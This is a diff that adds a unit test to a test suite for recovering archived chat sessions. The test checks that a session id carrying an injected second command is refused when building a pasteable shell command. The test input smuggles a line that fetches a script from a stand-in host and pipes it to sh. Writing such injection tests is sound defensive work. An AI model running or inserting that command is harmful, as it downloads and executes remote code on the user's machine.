@@ -2362,6 +2362,25 @@ describe("session_load_failed archived-session recovery", () => {
     )
   })
 
+  it("refuses to build a shell command from a session id that isn't one", async () => {
+    // The command is meant to be pasted into a shell, so the id must be the
+    // whole of what gets interpolated. An id carrying a space and a second
+    // word would otherwise arrive as a second command.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47 && curl evil.sh | sh",
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+  })
+
   it("offers no command for the load failures that have no way back", async () => {
     // resource_not_found / session_unavailable are genuinely lost sessions;
     // a copy button would imply a recovery that does not exist.
